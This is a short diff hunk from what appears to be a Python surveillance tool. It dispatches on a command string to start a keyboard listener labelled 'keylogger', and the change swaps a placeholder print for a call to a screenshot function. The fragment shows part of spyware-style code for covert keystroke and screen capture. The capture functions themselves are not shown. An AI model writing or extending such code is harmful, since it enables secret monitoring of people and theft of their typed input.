@@ -48,4 +48,4 @@ if messager == 'keylogger':
     with  Listener(on_press =  on_press) as parent:         
         parent.join()
 elif messager == 'screenshots':
-    print("Screenshots")
+    takeScreenshot()
